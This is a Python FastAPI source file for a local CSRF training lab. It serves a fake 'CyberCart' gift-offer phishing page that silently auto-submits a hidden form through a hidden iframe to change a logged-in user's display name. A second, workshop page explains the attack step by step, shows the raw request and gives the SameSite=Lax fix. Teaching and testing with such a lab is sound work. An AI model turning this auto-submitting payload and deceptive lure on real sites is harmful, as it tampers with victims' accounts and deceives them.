"""
Attacker Site — Task 4: CSRF Demo  |  Port: 7000

GET /       Convincing phishing page. Auto-submits CSRF in a hidden iframe.
GET /demo   Workshop/transparent mode. Step-by-step explanation + manual trigger.

CSRF target:  POST http://localhost:8000/api/me/update
              Body (form-urlencoded): display_name=H4CKED_BY_ATTACKER
              Auth: session_id cookie (SameSite=None -> sent cross-origin automatically)

Fix: SESSION_COOKIE_SAMESITE=lax  in backend .env
"""

from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI(title="Attacker Site - CSRF Demo")

BACKEND = "http://localhost:8000"
CSRF_ENDPOINT = BACKEND + "/api/me/update"
ATTACKER_NAME = "H4CKED_BY_ATTACKER"


PHISHING_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CyberCart -- Exclusive Offer!</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg-1: #0f0c29;
      --bg-2: #302b63;
      --bg-3: #24243e;
      --gold-1: #f7971e;
      --gold-2: #ffd200;
      --card-bg: rgba(255, 255, 255, 0.06);
      --card-border: rgba(255, 255, 255, 0.14);
      --text-dim: rgba(255, 255, 255, 0.68);
    }

    body {
      font-family: 'Segoe UI', Inter, system-ui, sans-serif;
      background: radial-gradient(circle at 20% 20%, rgba(247, 151, 30, 0.15), transparent 45%),
                  radial-gradient(circle at 80% 80%, rgba(88, 101, 242, 0.18), transparent 45%),
                  linear-gradient(135deg, var(--bg-1), var(--bg-2), var(--bg-3));
      background-attachment: fixed;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      padding: 1.5rem;
    }

    .card {
      background: var(--card-bg);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
      border: 1px solid var(--card-border);
      border-radius: 24px;
      padding: 3rem 2.5rem;
      max-width: 480px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
      animation: rise 0.5s ease-out;
    }

    @keyframes rise {
      from { opacity: 0; transform: translateY(16px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .emoji {
      font-size: 3.6rem;
      margin-bottom: 1rem;
      filter: drop-shadow(0 4px 12px rgba(255, 210, 0, 0.35));
    }

    h1 {
      font-size: 1.9rem;
      font-weight: 700;
      margin-bottom: 0.6rem;
      letter-spacing: -0.02em;
    }

    p {
      color: var(--text-dim);
      line-height: 1.7;
      margin: 1rem 0;
      font-size: 0.98rem;
    }

    .badge {
      display: inline-block;
      background: linear-gradient(90deg, var(--gold-1), var(--gold-2));
      color: #1a1400;
      border-radius: 999px;
      padding: 0.45rem 1.3rem;
      font-weight: 700;
      font-size: 0.85rem;
      letter-spacing: 0.03em;
      margin: 0.75rem 0;
      box-shadow: 0 6px 18px rgba(255, 210, 0, 0.25);
    }

    .spinner {
      width: 30px;
      height: 30px;
      border: 3px solid rgba(255, 255, 255, 0.15);
      border-top-color: var(--gold-2);
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 1.75rem auto 0;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .fine-print {
      font-size: 0.68rem;
      color: rgba(255, 255, 255, 0.28);
      margin-top: 2.2rem;
      letter-spacing: 0.01em;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="emoji">🎁</div>
    <h1>You've been selected!</h1>
    <span class="badge">EXCLUSIVE OFFER</span>
    <p>As a valued CyberCart customer, you've been chosen to receive a
    <strong>free mystery gift</strong> delivered to your address on file.</p>
    <p>We're verifying your details now...</p>
    <div class="spinner"></div>
    <p class="fine-print">CyberCart &copy; 2026 - This offer is based on your purchase history.</p>
  </div>

  <!-- CSRF PAYLOAD: silent hidden iframe + auto-submitting form -->
  <iframe name="csrf_sink" style="display:none"></iframe>
  <form id="csrf_form"
    action="CSRF_ENDPOINT_PLACEHOLDER"
    method="POST"
    enctype="application/x-www-form-urlencoded"
    target="csrf_sink">
    <input type="hidden" name="display_name" value="ATTACKER_NAME_PLACEHOLDER" />
  </form>
  <script>document.getElementById('csrf_form').submit();</script>
</body>
</html>"""

PHISHING_HTML = PHISHING_HTML.replace("CSRF_ENDPOINT_PLACEHOLDER", CSRF_ENDPOINT)
PHISHING_HTML = PHISHING_HTML.replace("ATTACKER_NAME_PLACEHOLDER", ATTACKER_NAME)


DEMO_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CSRF Demo - Workshop Mode</title>
  <style>
    * { box-sizing: border-box; }

    :root {
      --bg: #0d1117;
      --panel: #161b22;
      --panel-2: #1f2937;
      --border: #30363d;
      --red: #f85149;
      --green: #3fb950;
      --blue: #58a6ff;
      --text: #c9d1d9;
      --text-bright: #f0f6fc;
      --code: #79c0ff;
    }

    body {
      font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
      background:
        radial-gradient(circle at 15% 0%, rgba(88, 166, 255, 0.06), transparent 40%),
        radial-gradient(circle at 85% 100%, rgba(248, 81, 73, 0.06), transparent 40%),
        var(--bg);
      color: var(--text);
      padding: 2.5rem 1.5rem;
      max-width: 800px;
      margin: 0 auto;
      line-height: 1.5;
    }

    .eyebrow {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      font-size: 0.72rem;
      font-weight: 700;
      letter-spacing: 0.08em;
      color: var(--red);
      background: rgba(248, 81, 73, 0.1);
      border: 1px solid rgba(248, 81, 73, 0.35);
      border-radius: 999px;
      padding: 0.3rem 0.85rem;
      margin-bottom: 1rem;
    }

    .eyebrow::before {
      content: "";
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: var(--red);
      box-shadow: 0 0 8px var(--red);
    }

    h1 {
      color: var(--text-bright);
      font-size: 1.7rem;
      font-weight: 700;
      margin-bottom: 0.4rem;
      letter-spacing: -0.01em;
    }

    .subtitle {
      color: var(--text);
      opacity: 0.6;
      font-size: 0.85rem;
      margin-bottom: 1.75rem;
    }

    .subtitle code { margin: 0 0.15rem; }

    h2 {
      color: var(--blue);
      font-size: 1rem;
      margin-bottom: 0.85rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .box {
      border: 1px solid var(--border);
      border-left: 3px solid var(--border);
      border-radius: 10px;
      padding: 1.3rem 1.4rem;
      margin: 1.1rem 0;
      background: var(--panel);
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
    }

    .red   { border-left-color: var(--red); }
    .green { border-left-color: var(--green); }
    .blue  { border-left-color: var(--blue); }

    code {
      background: var(--panel-2);
      padding: 0.15rem 0.45rem;
      border-radius: 5px;
      color: var(--code);
      font-size: 0.88em;
    }

    pre {
      background: var(--panel-2);
      border: 1px solid rgba(255, 255, 255, 0.05);
      padding: 1rem 1.1rem;
      border-radius: 8px;
      overflow-x: auto;
      color: #a5f3fc;
      margin: 0.6rem 0;
      font-size: 0.83rem;
      line-height: 1.6;
    }

    button {
      background: linear-gradient(135deg, #ff6a5e, var(--red));
      border: none;
      border-radius: 8px;
      color: white;
      padding: 0.7rem 1.5rem;
      font-size: 0.95rem;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
      margin-top: 0.7rem;
      box-shadow: 0 6px 16px rgba(248, 81, 73, 0.3);
      transition: transform 0.15s ease, box-shadow 0.15s ease;
    }

    button:hover {
      transform: translateY(-1px);
      box-shadow: 0 8px 20px rgba(248, 81, 73, 0.4);
    }

    button:active { transform: translateY(0); }

    ol { counter-reset: step; list-style: none; padding: 0; }

    li {
      counter-increment: step;
      padding-left: 2.4rem;
      position: relative;
      margin: 0.9rem 0;
      font-size: 0.92rem;
    }

    li::before {
      content: counter(step);
      position: absolute;
      left: 0;
      top: -0.1rem;
      background: var(--blue);
      color: var(--bg);
      border-radius: 50%;
      width: 1.5rem;
      height: 1.5rem;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      font-size: 0.75rem;
      font-weight: 700;
    }

    a {
      color: var(--blue);
      text-decoration: none;
      border-bottom: 1px solid rgba(88, 166, 255, 0.35);
    }

    a:hover { border-bottom-color: var(--blue); }

    #result {
      margin-top: 1rem;
      padding: 0.85rem 1rem;
      border-radius: 8px;
      background: rgba(63, 185, 80, 0.1);
      border: 1px solid rgba(63, 185, 80, 0.35);
      color: var(--green);
      font-weight: 600;
      font-size: 0.9rem;
      display: none;
    }

    .footer-note {
      text-align: center;
      opacity: 0.35;
      font-size: 0.75rem;
      margin-top: 2.5rem;
    }
  </style>
</head>
<body>
  <span class="eyebrow">ATTACKER SITE / LAB</span>
  <h1>Task 4 — CSRF Attack Demo</h1>
  <p class="subtitle"><code>localhost:7000</code> &rarr; targeting <code>localhost:8000</code></p>

  <div class="box red">
    <h2>🧭 Attack Flow</h2>
    <ol>
      <li>Victim logs into CyberCart at <code>localhost:5173</code> -&gt; gets <code>session_id</code> cookie</li>
      <li>Cookie has <code>SameSite=None</code> -&gt; browser will send it on ANY origin's request</li>
      <li>Victim visits this page (<code>localhost:7000</code>) - a DIFFERENT origin</li>
      <li>This page submits a hidden form to <code>POST /api/me/update</code></li>
      <li>Browser automatically includes <code>session_id</code> cookie</li>
      <li>Backend processes it as the victim -&gt; display_name changed!</li>
    </ol>
  </div>

  <div class="box blue">
    <h2>📦 The Payload</h2>
    <pre>POST CSRF_ENDPOINT_PLACEHOLDER
Content-Type: application/x-www-form-urlencoded
Cookie: session_id=&lt;victim_session&gt;    &lt;-- sent automatically!

display_name=ATTACKER_NAME_PLACEHOLDER</pre>
    <p style="font-size:0.88rem; opacity:0.75; margin-top:0.4rem;">No CSRF token is required - the endpoint does not check for one.</p>
  </div>

  <div class="box">
    <h2>▶️ Launch Attack Manually</h2>
    <p style="font-size:0.88rem; opacity:0.75; margin-bottom:0.4rem;">Make sure you are logged into CyberCart first, then click:</p>
    <form id="attack_form" action="CSRF_ENDPOINT_PLACEHOLDER" method="POST"
          enctype="application/x-www-form-urlencoded" target="csrf_sink">
      <input type="hidden" name="display_name" value="ATTACKER_NAME_PLACEHOLDER" />
      <button type="submit">Launch CSRF Attack</button>
    </form>
    <iframe name="csrf_sink" style="display:none"></iframe>
    <div id="result">
      ✅ Done! Go to <a href="http://localhost:5173/orders" target="_blank">CyberCart -&gt; Orders</a>
      and reload - the nav should show <strong>ATTACKER_NAME_PLACEHOLDER</strong>.
    </div>
    <script>
      document.getElementById('attack_form').addEventListener('submit', function() {
        setTimeout(function() { document.getElementById('result').style.display = 'block'; }, 600);
      });
    </script>
  </div>

  <div class="box green">
    <h2>🛡️ The Fix</h2>
    <p style="font-size:0.88rem; opacity:0.85; margin-bottom:0.4rem;">In <code>backend/.env</code>, change:</p>
    <pre>SESSION_COOKIE_SAMESITE=lax
SESSION_COOKIE_SECURE=false</pre>
    <p style="font-size:0.88rem; opacity:0.75; margin-top:0.4rem;">With SameSite=Lax, browser will NOT send cookie on cross-origin POST -&gt; 401 Unauthorized.</p>
    <p style="font-size:0.88rem; margin-top:0.6rem;">Check current status: <a href="BACKEND_PLACEHOLDER/api/lab/csrf-status" target="_blank">/api/lab/csrf-status</a></p>
  </div>

  <p class="footer-note">Local CSRF training lab — for educational use only</p>
</body>
</html>"""

DEMO_HTML = DEMO_HTML.replace("CSRF_ENDPOINT_PLACEHOLDER", CSRF_ENDPOINT)
DEMO_HTML = DEMO_HTML.replace("ATTACKER_NAME_PLACEHOLDER", ATTACKER_NAME)
DEMO_HTML = DEMO_HTML.replace("BACKEND_PLACEHOLDER", BACKEND)


@app.get("/", response_class=HTMLResponse)
def phishing_page():
    """Realistic attack page - auto-submits CSRF silently."""
    return HTMLResponse(PHISHING_HTML)


@app.get("/demo", response_class=HTMLResponse)
def demo_page():
    """Workshop transparent mode - explains each step."""
    return HTMLResponse(DEMO_HTML)
